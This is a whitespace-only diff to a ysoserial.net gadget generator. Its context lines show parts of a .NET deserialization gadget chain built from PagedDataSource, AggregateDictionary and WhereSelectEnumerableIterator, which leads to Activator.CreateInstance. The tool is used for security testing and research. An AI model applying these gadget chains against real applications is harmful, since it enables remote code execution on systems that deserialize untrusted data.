@@ -72,7 +72,7 @@ namespace ysoserial.Generators
 
                 // PagedDataSource maps an arbitrary IEnumerable to an ICollection
                 PagedDataSource pds = new PagedDataSource() { DataSource = e3 };
-                // AggregateDictionary maps an arbitrary ICollection to an IDictionary 
+                // AggregateDictionary maps an arbitrary ICollection to an IDictionary
                 // Class is internal so need to use reflection.
                 IDictionary dict = (IDictionary)Activator.CreateInstance(typeof(int).Assembly.GetType("System.Runtime.Remoting.Channels.AggregateDictionary"), pds);
 
@@ -92,7 +92,7 @@ namespace ysoserial.Generators
             }
             //Default, use compatible mode.
             //Old technique contains a compiler-generated class [System.Core]System.Linq.Enumerable+<SelectManyIterator>d__[Compiler_Generated_Class_SEQ]`2,
-            //the Compiler_Generated_Class_SEQ may NOT same in different version of .net framework. 
+            //the Compiler_Generated_Class_SEQ may NOT same in different version of .net framework.
             //For example, in .net framework 4.6 was 16,and 17 in .net framework 4.7.
             //New technique use [System.Core]System.Linq.Enumerable+WhereSelectEnumerableIterator`2 only to fix it.
             //It make compatible from v3.5 to lastest(needs to using v3.5 compiler, and may also need to call disable type check first if target runtime was v4.8+).
@@ -120,7 +120,7 @@ namespace ysoserial.Generators
                 //bool MoveNext(this) => Func<IEnumerator<Type>,bool> => predicate
                 //Type get_Current(this) => Func<IEnumerator<Type>,Type> => selector
                 //
-                //WhereSelectEnumerableIterator`2.MoveNext => 
+                //WhereSelectEnumerableIterator`2.MoveNext =>
                 //  if(predicate(IEnumerator<Type>)) {selector(IEnumerator<Type>);} =>
                 //  IEnumerator<Type>.MoveNext();return IEnumerator<Type>.Current;
                 IEnumerable<Type> e5 = CreateWhereSelectEnumerableIterator<IEnumerator<Type>, Type>(e4,
@@ -138,7 +138,7 @@ namespace ysoserial.Generators
                 IEnumerable<object> end = CreateWhereSelectEnumerableIterator<Type, object>(e5, null, Activator.CreateInstance);
                 // PagedDataSource maps an arbitrary IEnumerable to an ICollection
                 PagedDataSource pds = new PagedDataSource() { DataSource = end };
-                // AggregateDictionary maps an arbitrary ICollection to an IDictionary 
+                // AggregateDictionary maps an arbitrary ICollection to an IDictionary
                 // Class is internal so need to use reflection.
                 IDictionary dict = (IDictionary)Activator.CreateInstance(typeof(int).Assembly.GetType("System.Runtime.Remoting.Channels.AggregateDictionary"), pds);
 
